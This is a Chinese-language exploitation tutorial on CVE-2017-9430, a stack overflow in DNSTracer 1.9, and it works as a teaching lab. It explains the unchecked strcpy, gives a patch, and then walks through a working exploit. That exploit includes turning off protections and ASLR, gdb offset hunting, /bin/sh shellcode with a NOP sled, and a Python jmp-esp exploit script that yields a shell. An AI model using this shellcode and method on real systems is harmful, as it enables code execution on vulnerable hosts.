# 7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞

- [漏洞描述](#漏洞描述)
- [漏洞复现](#漏洞复现)
- [漏洞分析](#漏洞分析)
- [Exploit](#exploit)
- [参考资料](#参考资料)

[下载文件](../src/exploit/7.1.6_dnstracer_2017-9430)

## 漏洞描述

DNSTracer 是一个用来跟踪 DNS 解析过程的应用程序。DNSTracer 1.9 及之前的版本中存在栈缓冲区溢出漏洞。攻击者可借助带有较长参数的命令行利用该漏洞造成拒绝服务攻击。

## 漏洞复现

| |推荐使用的环境 | 备注 |
| --- | --- | --- |
| 操作系统 | Ubuntu 12.04 | 体系结构：32 位 |
| 调试器 | gdb-peda | 版本号：7.4 |
| 漏洞软件 | DNSTracer | 版本号：1.9 |

首先编译安装 DNSTracer：

```text
$ wget http://www.mavetju.org/download/dnstracer-1.9.tar.gz
$ tar zxvf dnstracer-1.9.tar.gz
$ cd dnstracer-1.9
$ ./confugure
$ make && sudo make install
```

传入一段超长的字符串作为参数即可触发栈溢出：

```text
$ dnstracer -v $(python -c 'print "A"*1025')
*** buffer overflow detected ***: dnstracer terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb757f377]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x68)[0xb760f6b8]
/lib/i386-linux-gnu/libc.so.6(+0xf58a8)[0xb760d8a8]
/lib/i386-linux-gnu/libc.so.6(+0xf4e9f)[0xb760ce9f]
dnstracer[0x8048f26]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7530637]
dnstracer[0x804920a]
======= Memory map: ========
08048000-0804e000 r-xp 00000000 08:01 270483     /usr/local/bin/dnstracer
0804f000-08050000 r--p 00006000 08:01 270483     /usr/local/bin/dnstracer
08050000-08051000 rw-p 00007000 08:01 270483     /usr/local/bin/dnstracer
08051000-08053000 rw-p 00000000 00:00 0
084b6000-084d7000 rw-p 00000000 00:00 0          [heap]
b74e4000-b7500000 r-xp 00000000 08:01 394789     /lib/i386-linux-gnu/libgcc_s.so.1
b7500000-b7501000 rw-p 0001b000 08:01 394789     /lib/i386-linux-gnu/libgcc_s.so.1
b7518000-b76c8000 r-xp 00000000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so
b76c8000-b76ca000 r--p 001af000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so
b76ca000-b76cb000 rw-p 001b1000 08:01 394751     /lib/i386-linux-gnu/libc-2.23.so
b76cb000-b76ce000 rw-p 00000000 00:00 0
b76e4000-b76e7000 rw-p 00000000 00:00 0
b76e7000-b76e9000 r--p 00000000 00:00 0          [vvar]
b76e9000-b76eb000 r-xp 00000000 00:00 0          [vdso]
b76eb000-b770d000 r-xp 00000000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so
b770d000-b770e000 rw-p 00000000 00:00 0
b770e000-b770f000 r--p 00022000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so
b770f000-b7710000 rw-p 00023000 08:01 394723     /lib/i386-linux-gnu/ld-2.23.so
bf8e5000-bf907000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)
```

## 漏洞分析

这个漏洞非常简单也非常典型，发生原因是在把参数 `argv[0]` 复制到数组 `argv0` 的时候没有做长度检查，如果大于 1024 字节，就会导致栈溢出：

```c
// dnstracer.c
int
main(int argc, char **argv)
{
    [...]
    char	argv0[NS_MAXDNAME];
    [...]
    strcpy(argv0, argv[0]);
```

```c
// dnstracer_broker.h
#ifndef NS_MAXDNAME
#define NS_MAXDNAME	1024
#endif
```

### 补丁

要修这个漏洞的话，在调用 `strcpy()` 前加上对参数长度的检查就可以了：

```c
    /*CVE-2017-9430 Fix*/
    if(strlen(argv[0]) >= NS_MAXDNAME)
    {
        free(server_ip);
        free(server_name);
        fprintf(stderr, "dnstracer: argument is too long %s\n", argv[0]);
        return 1;
    }

    // check for a trailing dot
    strcpy(argv0, argv[0]);
```

## Exploit

首先修改 Makefile，关掉栈保护，同时避免 gcc 使用安全函数 `__strcpy_chk()` 替换 `strcpy()`，修改编译选项如下：

```text
$ cat Makefile | grep -w CC
CC = gcc -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0
COMPILE = $(CC) $(DEFS) $(DEFAULT_INCLUDES) $(INCLUDES) $(AM_CPPFLAGS) \
CCLD = $(CC)
$ make && sudo make install
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

最后关掉 ASLR：

```text
# echo 0 > /proc/sys/kernel/randomize_va_space
```

因为漏洞发生在 main 函数中，堆栈的布置比起在子函数里也要复杂一些。大体过程和前面写过的一篇 wget 溢出漏洞差不多，但那一篇是 64 位程序，所以这里选择展示一下 32 位程序。

在 gdb 里进行调试，利用 pattern 确定溢出位置，1060 字节就足够了：

```text
gdb-peda$ pattern_create 1060
gdb-peda$ pattern_offset $ebp
1849771630 found at offset: 1049
```

所以返回地址位于栈偏移 `1049+4=1053` 的地方。

```text
gdb-peda$ disassemble main
   0x08048df8 <+808>:	mov    DWORD PTR [esp+0x4],edi
   0x08048dfc <+812>:	mov    DWORD PTR [esp],ebx
   0x08048dff <+815>:	call   0x8048950 <strcpy@plt>
   0x08048e04 <+820>:	xor    eax,eax
   0x08048e06 <+822>:	mov    ecx,esi
   ...
   0x08048f6e <+1182>:	mov    DWORD PTR [esp+0x4],esi
   0x08048f72 <+1186>:	call   0x804adb0 <create_session>
   0x08048f77 <+1191>:	mov    DWORD PTR [esp],0xa
```

在下面几个地方下断点，并根据偏移调整我们的输入：

```text
gdb-peda$ b *main+815
gdb-peda$ b *main+820
gdb-peda$ b *main+1186
gdb-peda$ r `perl -e 'print "A"x1053 . "BBBB"'`
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0xbfffeb3f --> 0xffed9cb7
ECX: 0x0
EDX: 0xb7fc7180 --> 0x0
ESI: 0xffffffff
EDI: 0xbffff174 ('A' <repeats 200 times>...)
EBP: 0xbfffef58 --> 0x0
ESP: 0xbfffe6d0 --> 0xbfffeb3f --> 0xffed9cb7
EIP: 0x8048dff (<main+815>:	call   0x8048950 <strcpy@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048df1 <main+801>:	lea    ebx,[esp+0x46f]
   0x8048df8 <main+808>:	mov    DWORD PTR [esp+0x4],edi
   0x8048dfc <main+812>:	mov    DWORD PTR [esp],ebx
=> 0x8048dff <main+815>:	call   0x8048950 <strcpy@plt>
   0x8048e04 <main+820>:	xor    eax,eax
   0x8048e06 <main+822>:	mov    ecx,esi
   0x8048e08 <main+824>:	repnz scas al,BYTE PTR es:[edi]
   0x8048e0a <main+826>:	not    ecx
Guessed arguments:
arg[0]: 0xbfffeb3f --> 0xffed9cb7
arg[1]: 0xbffff174 ('A' <repeats 200 times>...)
[------------------------------------stack-------------------------------------]
0000| 0xbfffe6d0 --> 0xbfffeb3f --> 0xffed9cb7
0004| 0xbfffe6d4 --> 0xbffff174 ('A' <repeats 200 times>...)
0008| 0xbfffe6d8 --> 0x804be37 ("4cCoq:r:S:s:t:v")
0012| 0xbfffe6dc --> 0x0
0016| 0xbfffe6e0 --> 0x0
0020| 0xbfffe6e4 --> 0x0
0024| 0xbfffe6e8 --> 0x0
0028| 0xbfffe6ec --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048dff in main (argc=<optimized out>, argv=<optimized out>) at dnstracer.c:1622
1622	    strcpy(argv0, argv[0]);
gdb-peda$ x/10wx argv0
0xbfffeb3f:	0xffed9cb7	0x000000bf	0x00000100	0x00000200
0xbfffeb4f:	0xe33b9700	0xfdcac0b7	0x000000b7	0xffeff400
0xbfffeb5f:	0xe24e08b7	0x000001b7
```

所以栈位于 `0xbfffeb3f`，执行这一行代码即可将 `0xbffff174` 处的 "A" 字符串复制到 `argv0` 数组中：

```text
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xbfffe6bf ('A' <repeats 200 times>...)
EBX: 0xbfffe6bf ('A' <repeats 200 times>...)
ECX: 0xbffff1d0 ("BBBB")
EDX: 0xbfffeadc ("BBBB")
ESI: 0x0
EDI: 0xbfffedb3 ('A' <repeats 200 times>...)
EBP: 0xbfffead8 ("AAAABBBB")
ESP: 0xbfffe290 --> 0xbfffe6bf ('A' <repeats 200 times>...)
EIP: 0x8048dba (<main+794>:	mov    ecx,DWORD PTR [ebp-0x82c])
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048db3 <main+787>:	push   edi
   0x8048db4 <main+788>:	push   ebx
   0x8048db5 <main+789>:	call   0x8048920 <strcpy@plt>
=> 0x8048dba <main+794>:	mov    ecx,DWORD PTR [ebp-0x82c]
   0x8048dc0 <main+800>:	xor    eax,eax
   0x8048dc2 <main+802>:	add    esp,0x10
   0x8048dc5 <main+805>:	repnz scas al,BYTE PTR es:[edi]
   0x8048dc7 <main+807>:	not    ecx
[------------------------------------stack-------------------------------------]
0000| 0xbfffe290 --> 0xbfffe6bf ('A' <repeats 200 times>...)
0004| 0xbfffe294 --> 0xbfffedb3 ('A' <repeats 200 times>...)
0008| 0xbfffe298 --> 0xffffffff
0012| 0xbfffe29c --> 0xffffffff
0016| 0xbfffe2a0 --> 0x0
0020| 0xbfffe2a4 --> 0x0
0024| 0xbfffe2a8 --> 0x8051018 ("127.0.1.1")
0028| 0xbfffe2ac --> 0xffffffff
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, main (argc=<optimized out>, argv=<optimized out>) at dnstracer.c:1623
1623	    if (argv0[strlen(argv[0]) - 1] == '.') argv0[strlen(argv[0]) - 1] = 0;
gdb-peda$ x/10wx argv0
0xbfffeb3f:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeb4f:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeb5f:	0x41414141	0x41414141
gdb-peda$ x/5wx argv0+1053-0x10
0xbfffef4c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffef5c:	0x42424242
```

同时字符串 "BBBB" 覆盖了返回地址。所以我们用栈地址 `0xbfffeb3f` 替换掉 "BBBB"：

```text
gdb-peda$ r  `perl -e 'print "A"x1053 . "\x3f\xeb\xff\xbf"'`
```

```text
gdb-peda$ x/5wx argv0+1053-0x10
0xbfffef4c:	0x41414141	0x41414141	0x41414141	0x41414141  <-- ebp
0xbfffef5c:	0xbfffeb3f                                      <-- return address
```

然后就可以在栈上布置 shellcode 了，这一段 shellcode 长度为 23 字节，前面使用 nop 指令填充：

```text
gdb-peda$ r `perl -e 'print "\x90"x1030 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x3f\xeb\xff\xbf"'`
gdb-peda$ x/7wx argv0+1053-23
0xbfffef45:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e  <-- shellcode
0xbfffef55:	0xb0e18953	0x3f80cd0b	0x00bfffeb
```

根据计算，shellcode 位于 `0xbfffef45`。

然而当我们执行这个程序的时候，发生了错误：

```text
gdb-peda$ c
127.0.0.1 (127.0.0.1) * * *

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xbfffef54 ("/bin//sh")
ECX: 0xffffffff
EDX: 0xb7fc88b8 --> 0x0
ESI: 0xe3896e69
EDI: 0xe1895350
EBP: 0x80cd0bb0
ESP: 0xbfffef54 ("/bin//sh")
EIP: 0xbfffef55 ("bin//sh")
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xbfffef4d:	push   0x6e69622f
   0xbfffef52:	mov    ebx,esp
   0xbfffef54:	das
=> 0xbfffef55:	bound  ebp,QWORD PTR [ecx+0x6e]
   0xbfffef58:	das
   0xbfffef59:	das
   0xbfffef5a:	jae    0xbfffefc4
   0xbfffef5c:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbfffef54 ("/bin//sh")
0004| 0xbfffef58 ("//sh")
0008| 0xbfffef5c --> 0x0
0012| 0xbfffef60 --> 0x0
0016| 0xbfffef64 --> 0xbfffeff4 --> 0xbffff15b ("/usr/local/bin/dnstracer")
0020| 0xbfffef68 --> 0xbffff000 --> 0xbffff596 ("SSH_AGENT_PID=1407")
0024| 0xbfffef6c --> 0xb7fdc858 --> 0xb7e21000 --> 0x464c457f
0028| 0xbfffef70 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xbfffef55 in ?? ()
```

错误发生在 `0xbfffef55`，而 shellcode 位于 `0xbfffef45`，两者相差 16 字节：

```text
gdb-peda$ x/8wx 0xbfffef45
0xbfffef45:	0x6850c031	0x68732f2f	0x69622f68	0x2fe3896e
0xbfffef55:	0x2f6e6962	0x0068732f	0x00000000	0xf4000000
```

所以这里采用的解决办法是去掉前面的 16 个 nop，将其加到 shellcode 后面。

```text
gdb-peda$ r `perl -e 'print "\x90"x1014 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x16 . "\x3f\xeb\xff\xbf"'`
```

成功获得 shell。

```text
gdb-peda$ c
127.0.0.1 (127.0.0.1) * * *
process 7161 is executing new program: /bin/dash
$ id
[New process 7165]
process 7165 is executing new program: /usr/bin/id
uid=1000(firmy) gid=1000(firmy) groups=1000(firmy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ [Inferior 2 (process 7165) exited normally]
Warning: not running or target is remote
```

那如果我们开启了 ASLR 怎么办呢，一种常用的方法是利用指令 `jmp esp` 覆盖返回地址，这将使程序在返回地址的地方继续执行，从而执行跟在后面的 shellcode。利用 objdump 就可以找到这样的指令：

```text
$ objdump -M intel -D /usr/local/bin/dnstracer | grep jmp | grep esp
 804cc5f:	ff e4                	jmp    esp
```

exp 如下：

```python
import os
from subprocess import call

def exp():
    filling = "A"*1053
    jmp_esp = "\x5f\xcc\x04\x08"
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    payload = filling + jmp_esp + shellcode
    call(["dnstracer", payload])

if __name__ == '__main__':
    try:
        exp()
    except Exception as e:
        print "Something went wrong"
```

Bingo!!!

```text
$ python exp.py
Tracing to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_�1�Ph//shh/bin��PS���
                                                                            [a] via 127.0.0.1, maximum of 3 retries
127.0.0.1 (127.0.0.1) * * *
$ id
uid=1000(firmy) gid=1000(firmy) groups=1000(firmy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

## 参考资料

- <http://www.mavetju.org/unix/dnstracer.php>
- [CVE-2017-9430](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9430)
- [DNSTracer 1.9 - Local Buffer Overflow](https://www.exploit-db.com/exploits/42424/)
- [DNSTracer 1.8.1 - Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/42115/)
